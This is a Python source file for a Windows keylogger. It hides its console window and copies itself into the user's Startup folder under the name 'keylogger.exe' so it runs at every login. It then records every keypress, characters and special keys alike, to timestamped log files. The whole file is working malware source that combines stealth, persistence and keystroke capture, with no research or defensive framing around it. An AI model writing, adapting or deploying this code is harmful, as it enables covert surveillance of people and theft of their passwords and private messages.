import os
import sys
import shutil
import ctypes
import logging
from datetime import datetime
from pynput import keyboard

# === Hide console window (when .exe only) ===
try:
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
except:
    pass  # avoid crash on non-Windows or during testing

# === Auto-run on startup (only works when compiled to .exe) ===
def autorun():
    try:
        startup = os.path.join(os.getenv('APPDATA'), 'Microsoft\\Windows\\Start Menu\\Programs\\Startup')
        exe_name = "keylogger.exe"
        dest_path = os.path.join(startup, exe_name)

        if not os.path.exists(dest_path):
            shutil.copyfile(sys.executable, dest_path)
    except:
        pass  # silently skip if not .exe or permission denied

autorun()

# === Setup logging ===
os.makedirs("logs", exist_ok=True)
log_file = f"logs/keylog_{datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}.txt"
logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s: %(message)s')

# === Define keypress behavior ===
def on_press(key):
    try:
        logging.info(f"Key: {key.char}")
    except AttributeError:
        logging.info(f"Special: {key}")

# === Start listening in background ===
listener = keyboard.Listener(on_press=on_press)
listener.start()

# === Keep script running ===
print(f"[Keylogger running...] Logs will be saved to: {log_file}")
input("Press ENTER here to stop logging...\n")

# === Stop listener gracefully ===
listener.stop()